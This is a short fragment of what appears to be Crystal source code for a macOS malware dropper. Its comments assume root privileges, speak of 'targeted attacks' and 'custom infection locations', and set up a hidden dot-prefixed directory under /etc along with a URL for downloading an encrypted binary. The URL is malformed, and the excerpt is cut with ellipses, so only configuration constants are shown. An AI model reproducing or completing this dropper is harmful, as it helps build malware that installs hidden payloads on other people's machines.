...
# Dropper supports macOS, but could be extended to Linux fairly easily since it only relies on crystal stdlib and openSSL.
# We assume this will be run with root privilages to simplify things.

# /etc is used during development for simplicity. Targeted attacks should use custom infection locations.
INFECTION_ROOT = "/etc"
DIRECTORY_NAME = "." + SecureRandom.uuid()
# This should point to the binary download location.
ENCRYPTED_BINARY_URL = "http://example..com/bin/"
...
# Maybe these should be generated via deterministic algo?
